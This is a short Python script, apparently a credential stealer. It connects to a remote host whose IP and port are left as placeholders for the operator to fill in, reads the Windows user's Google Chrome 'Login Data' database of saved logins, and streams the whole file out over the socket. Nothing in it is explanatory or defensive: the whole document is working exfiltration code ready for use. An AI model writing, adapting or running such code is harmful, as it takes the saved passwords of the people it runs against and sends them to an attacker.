import socket
import os
IP_ADDR = "INPUT YOUR IP HERE"
PORT = INPUT YOUR PORT HERE
s = socket.socket()
s.connect((IP_ADDR, PORT))
db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
with open(db_path, 'rb') as f:
  while True:
    bytes_read = f.read(1024)
    if not bytes_read:
      break
    s.sendall(bytes_read)
s.close()


    
